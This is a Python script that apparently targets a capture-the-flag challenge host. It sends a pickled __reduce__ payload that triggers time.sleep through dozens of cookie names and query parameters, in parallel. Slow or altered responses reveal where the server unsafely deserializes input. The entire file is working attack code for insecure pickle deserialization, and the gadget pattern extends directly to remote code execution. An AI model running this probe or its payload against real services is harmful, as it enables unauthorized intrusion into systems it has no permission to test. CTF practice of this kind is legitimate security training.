import requests, base64, pickle, time, concurrent.futures as cf
requests.packages.urllib3.disable_warnings()
H="kicyber-2bccd62e5d76-granny-makes-food-0-0.chals.io"
URL=f"https://{H}/"
import os
class Sleep:
    def __reduce__(self):
        return (time.sleep,(3,))
sleep_pickle = base64.b64encode(pickle.dumps(Sleep())).decode()
bad_pickle = base64.b64encode(b"garbage-not-pickle").decode()
URL_SAFE_SLEEP = base64.urlsafe_b64encode(pickle.dumps(Sleep())).decode()

cookies_names=["session","user","data","pickle","admin","auth","token","logged_in","preferences","config","id","__session","flag","sour"]
params="user username name admin id page file url uri path dest redirect next target fetch load proxy host site view template tpl src source cmd command debug q query search s lang theme action do func function method data input value val key token role auth pass password msg message content text dir include inc render format output result callback cb json xml type mode item items food recipe order cart menu cook bake sour souritem data pickled raw payload blob".split()

def probe_cookie(name):
    for cv in (URL_SAFE_SLEEP, sleep_pickle):
        t0=time.time()
        try:
            r=requests.get(URL, cookies={name:cv}, timeout=8, verify=False)
            dt=time.time()-t0
            if dt>1.5 or r.status_code!=200 or len(r.content)!=1481:
                return ("COOKIE", name, cv[:30], r.status_code, len(r.content), round(dt,2))
        except Exception as e:
            return ("COOKIE-E", name, str(e)[:50])
    return None

def probe_param(p):
    for val in (URL_SAFE_SLEEP, bad_pickle):
        t0=time.time()
        try:
            r=requests.get(URL, params={p:val}, timeout=8, verify=False)
            dt=time.time()-t0
            if dt>1.5 or r.status_code!=200 or len(r.content)!=1481:
                return ("PARAM", p, val[:30], r.status_code, len(r.content), round(dt,2))
        except Exception as e:
            return ("PARAM-E", p, str(e)[:50])
    return None

res=cf.ThreadPoolExecutor(max_workers=20)
futs=[res.submit(probe_cookie,n) for n in cookies_names]+[res.submit(probe_param,p) for p in params]
for f in futs:
    o=f.result()
    if o: print(o)
print("PICKLEPROBE DONE")
